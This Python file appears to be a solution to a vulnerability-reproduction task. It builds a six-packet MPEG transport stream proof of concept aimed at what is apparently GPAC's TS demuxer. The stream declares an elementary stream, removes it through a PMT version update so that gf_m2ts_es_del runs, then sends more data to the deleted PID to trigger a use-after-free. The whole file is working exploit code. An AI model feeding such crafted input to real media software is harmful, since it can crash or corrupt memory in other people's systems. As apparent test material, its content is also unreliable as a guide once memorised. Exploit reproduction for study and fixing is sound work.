import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        def mpeg_crc32(data):
            crc = 0xFFFFFFFF
            for byte in data:
                for i in range(7, -1, -1):
                    bit = (byte >> i) & 1
                    c31 = (crc >> 31) & 1
                    crc = (crc << 1) & 0xFFFFFFFF
                    if c31 ^ bit:
                        crc = crc ^ 0x04C11DB7
            return crc

        def make_ts_packet(pid, payload, cc, pusi=0):
            # TS Packet is 188 bytes
            # Header is 4 bytes
            header = bytearray([0x47])
            header.append((pusi << 6) | ((pid >> 8) & 0x1F))
            header.append(pid & 0xFF)
            
            # Payload capacity = 184 bytes
            needed_pad = 184 - len(payload)
            if needed_pad < 0:
                payload = payload[:184]
                needed_pad = 0
            
            afc = 1 # Payload only default
            adaptation = bytearray()
            
            if needed_pad > 0:
                afc = 3 # Adaptation + Payload
                # Adaptation Field
                if needed_pad == 1:
                     # Length = 0 (consumes 1 byte)
                     adaptation.append(0)
                else:
                    # Length field takes 1 byte
                    af_len = needed_pad - 1
                    adaptation.append(af_len)
                    if af_len > 0:
                        # Flags = 0 (1 byte)
                        adaptation.append(0)
                        # Stuffing (af_len - 1 bytes)
                        if af_len > 1:
                            adaptation.extend([0xFF] * (af_len - 1))
            
            header.append((afc << 4) | (cc & 0x0F))
            return header + adaptation + payload

        def make_psi_section(table_id, table_ext, version, section_data):
            # PSI Section Format
            # Header (3 bytes): TableID, SSI/Len
            # Extended Header (5 bytes): ID, Ver/CN, SecNum, LastSecNum
            # Data
            # CRC32 (4 bytes)
            
            # Calculate length field value (bytes following length field)
            # ExtHeader(5) + Data + CRC(4) = 9 + len(data)
            sec_len_val = 9 + len(section_data)
            
            head = bytearray()
            head.append(table_id)
            # SSI=1(0x80), Reserved=3(0x30), High 4 bits of len
            head.append(0xB0 | ((sec_len_val >> 8) & 0x0F))
            head.append(sec_len_val & 0xFF)
            
            head.append((table_ext >> 8) & 0xFF)
            head.append(table_ext & 0xFF)
            
            # Reserved(3)=11(0xC0), Version(5), CN(1)
            head.append(0xC0 | ((version & 0x1F) << 1) | 1)
            
            head.append(0) # Section Number
            head.append(0) # Last Section Number
            
            partial = head + section_data
            crc = mpeg_crc32(partial)
            
            return partial + struct.pack('>I', crc)

        # Build the PoC (6 packets, 1128 bytes)
        # Strategy: 
        # 1. Define PAT pointing to PMT.
        # 2. Define PMT pointing to an ES (Elementary Stream).
        # 3. Send data for that ES.
        # 4. Update PMT to remove that ES (triggering deletion).
        # 5. Send data for that ES again (triggering UAF).
        
        # Packet 1: PAT
        # Program 1 -> PID 0x100
        pat_payload = struct.pack('>H', 1) + struct.pack('>H', 0xE000 | 0x100)
        pat_sec = make_psi_section(0, 1, 0, pat_payload)
        pkt1 = make_ts_packet(0, bytearray([0]) + pat_sec, cc=0, pusi=1)
        
        # Packet 2: PMT Version 0
        # Program 1. PCR PID 0x1FF.
        # Stream 1: Type 0x1B (H.264), PID 0x200
        pmt_v0_data = struct.pack('>H', 0xE1FF) + struct.pack('>H', 0xF000)
        pmt_v0_data += bytearray([0x1B]) + struct.pack('>H', 0xE200) + struct.pack('>H', 0xF000)
        pmt_sec_v0 = make_psi_section(2, 1, 0, pmt_v0_data)
        pkt2 = make_ts_packet(0x100, bytearray([0]) + pmt_sec_v0, cc=0, pusi=1)
        
        # Packet 3: ES Data (PID 0x200)
        # Valid PES packet start
        es_payload = bytearray([0x00, 0x00, 0x01, 0xE0, 0x00, 0x00]) + b'\xAA'*100
        pkt3 = make_ts_packet(0x200, es_payload, cc=0, pusi=1)
        
        # Packet 4: PMT Version 1 (Update)
        # Removes Stream 1 (PID 0x200) to trigger gf_m2ts_es_del
        pmt_v1_data = struct.pack('>H', 0xE1FF) + struct.pack('>H', 0xF000)
        # No stream definitions
        pmt_sec_v1 = make_psi_section(2, 1, 1, pmt_v1_data)
        pkt4 = make_ts_packet(0x100, bytearray([0]) + pmt_sec_v1, cc=1, pusi=1)
        
        # Packet 5: ES Data (PID 0x200) - Trigger UAF
        # Sending data to the just-deleted stream
        pkt5 = make_ts_packet(0x200, b'\xBB'*100, cc=1, pusi=0)
        
        # Packet 6: ES Data (PID 0x200) - Sustain
        pkt6 = make_ts_packet(0x200, b'\xCC'*100, cc=2, pusi=0)
        
        return bytes(pkt1 + pkt2 + pkt3 + pkt4 + pkt5 + pkt6)